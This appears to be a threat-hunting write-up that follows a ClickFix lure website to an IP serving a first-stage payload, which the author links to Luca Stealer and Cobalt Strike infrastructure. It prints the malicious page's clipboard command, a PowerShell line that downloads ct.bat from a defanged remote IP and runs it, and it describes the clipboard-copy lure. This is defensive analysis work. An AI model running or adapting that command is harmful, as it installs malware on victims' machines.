## Overview

Grabbed a Clickfix IOC from Validin, following the breadcrumbs to see if I can attribute it to an adversary/malware strain.

Going to through out all IOCs and stuff because why not.

### Website serving Clickfix

"quirkyrealty[.]com"

Resolves to an Indian IP. Hosted by 'Web Werks India Pvt. Ltd. was an Indian data center and cloud solutions provider'

Google dork see what we can get. Looks like a legit business? Well a not very legit one.

Booting up my VM to hit the website to see how this is being served.

Alright few points here from the screenshot above.
- No redirects/iframes/weird JS
- Malicious JavaScript exists within the first HTTP request to the domain
- Payload command written in cleartext (whoop whoop)
- Can see a juicy IP and the file 'ct.bat' that is downloaded from there.

Here is the malicious .JS that copies the command to the user's clipboard
- Uses document.execCommand

Website is likely full comp'd or not legit in the first place.

Here is the full command from the ``command`` variable in the .JS
```const command = `powershell -c "Invoke-WebRequest -Uri 'hXXp://80[.]253[.]249[.]186:5504/ct.bat' -OutFile \"%temp%\ct.bat\" -UseBasicParsing; Start-Process \"%temp%\ct.bat\""`;```

### .Bat? 

```const command = `powershell -c "Invoke-WebRequest -Uri 'hXXp://80[.]253[.]249[.]186:5504/ct.bat' -OutFile \"%temp%\ct.bat\" -UseBasicParsing; Start-Process \"%temp%\ct.bat\""`;```

This is our payload command. Lets remove 'Start-Process', the const declaration and run it in my VM to save the file in temp.

```Invoke-WebRequest -Uri "hXXp://80[.]253[.]249[.]186:5504/ct.bat" -OutFile "C:\Users\ronald\Desktop\NewClicky\safe-file.txt"``

Alright well this is depressing. The file doesn't live on the web server anymore.

So lets see what I can figure out about this IP then...

### IP? What are you...

We can see that 'ct.bat' is being served from the IP 80[.]253[.]249[.]186 at port 5504. 

Quick DNSLytics lookup.

What services are running on the IP?

Fair few... that RCE CVE is juicy...

Anyhow, interesting that we can't see port 5504 here. Because that is the port that historically served 'ct.bat'

Hunt.io states it was last seen on the 9th of September. So I am one day late to the party.

Without any HTTP response body we can't do much else. Historical data is dry for this port on Censys, Validin and huntio.

For pivoting I'll look into RDP (3389)

A popular pivot from here is the SSL cert SHA_256 hash. Usually you would have to run an OpenSSL command to calculate this. But Validin has already calculated it for us.

Now when we search this hash we have another IP.

Snazzy. This gives us very high confidence they're related as they use the same RDP SSL cert!

Alright, when I whack this IP into VT I get some cool results.

We can see in the communicating files are Luca_Stealer. Specifically a Cobalt Strike beacon used for Luca Stealer. Assumely as a persistence method after exfilitration of initial data.

So, if I had to take an educated guess. I'd say our IP 80[.]253[.]249[.]186 serves the first stage payload for Luca Stealer.
